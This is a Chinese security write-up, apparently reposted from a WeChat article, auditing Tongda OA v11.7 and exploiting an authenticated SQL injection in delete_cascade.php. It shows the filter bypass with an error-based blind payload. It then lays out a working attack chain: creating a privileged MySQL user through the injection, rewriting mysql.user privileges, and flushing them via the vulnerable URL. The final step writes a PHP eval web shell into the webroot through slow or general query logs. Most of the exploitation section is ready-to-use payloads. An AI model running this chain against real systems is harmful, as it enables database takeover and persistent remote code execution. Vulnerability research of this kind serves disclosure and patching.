> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rtX9mJkPHd9njvM_PIrK_Q)

> Author: AdminTony

  

1.测试环境
======

测试版本：通达OA v11.7版本

限制条件：需要账号登录

2.代码审计发现注入
==========

注入出现在`general/hr/manage/query/delete_cascade.php`文件中，代码实现如下：

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlRexTKWxTiaeLG9olbyoG6214RaNbvSibzDs3cYW5N4RBnyUibXLThOJSw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

首先判断`$condition_cascade`是否为空，如果不为空，则将其中的`\'`替换为`'`。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用`addslashes`函数进行保护，如下：

`inc/common.inc.php`代码

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXl8Qqx9OiaExxpA2cI6qiaGE3OJ90h8rNJB1icKib2RYibb24CXSMzz5RlRHw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

因为是无回显机制，是盲注，所以尝试`(select 1 from (select sleep(5))a)`，结果没那么简单：

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlYhUiciaDddtnUzB9raysFuwZQKlDPJhXLb3u6RWDVlCUqric0pdmiaKTibg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

触发了通达OA的过滤机制，翻看代码，在`inc/conn.php`文件中找到过滤机制如下:

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlha2Y8u2rTtXibaVlmtJVSMQ90yYVlNqAMatJEYTLkPibed6SMeNWQkZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

其过滤了一些字符，但是并非无法绕过，盲注的核心是：`substr、if`等函数，均未被过滤，所以还是有机会的。

传入错误的SQL语句时，页面出错：

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlXEiaicb3o2hEeRVdWRadEcef2ZrGibic5zhqe1GV4DjyoUTW0HzkzFEajA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

那么只要构造MySQL报错即可配合`if`函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现`power(9999,99)`也可以使数据库报错，所以构造语句：

```
select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlyeFDXAEibeicBvHjfUXuAaqIHdmx2jicDrSTuZCLRd9GpsICbR7DbqdfA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlYoBiaGApp72rBOBxej4ESXePV89w5gIRsOxMrc9wJug4osmcrMbg5yw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

3.构造利用链
=======

*   添加用户：
    

```
grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
```

```
![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlqH7X8bvq6uMPjj4SfeiaBS0aCwwQqNPoojRYru8ejmfetI4iaRmqMTlg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXliaGial0HPbcBIGExV5CUicrZ0CiaebbHV5Isn7ybMlibibp5szNO8Ks0JfJQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：

```
UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('at666' AS Binary(5));
```

```
![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXl1lZZM0xo4A1K7G9MK9rzs3q9XGPZKwbZNQMSah7hrCBn3S4oEpo9jA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")  

```

然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：`general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;`这样就拥有了所有权限。再次登录：

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXl1UXZqeqPNO9yvERBobXicSMvTGiaPI0HddZA5G7T0jyvSWrYTtHzDJMg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

提示这个，或者让改密码死活改不了。再执行一下

```
grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@1
```

```
23' WITH GRANT OPTION  

```

即可。

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlNvDBlamZwspafUgPLzWjqWTSjRyd4BhtAOH71P9f04af9B5PIaSoVQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")

*   写shell：
    

```
`# 查路径：``select @@basedir; # c:\td0a117\mysql5\，那么web目录就是c:\td0a117\webroot\``# 方法1：``set global slow_query_log=on;``set global slow_query_log_file='C:/td0a117/webroot/tony.php';``select '<?php eval($_POST[x]);?>' or sleep(11);``# 方法2：``set global general_log = on;``set global general_log_file = 'C:/td0a117/webroot/tony2.php';``select '<?php eval($_POST[x]);?>';``show variables like '%general%';`
```

```
  

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlPgxy3pXbnabGd29Knlf9KRZS0vp97htvbdSnG4gMKu1OcqM8aZgKcw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")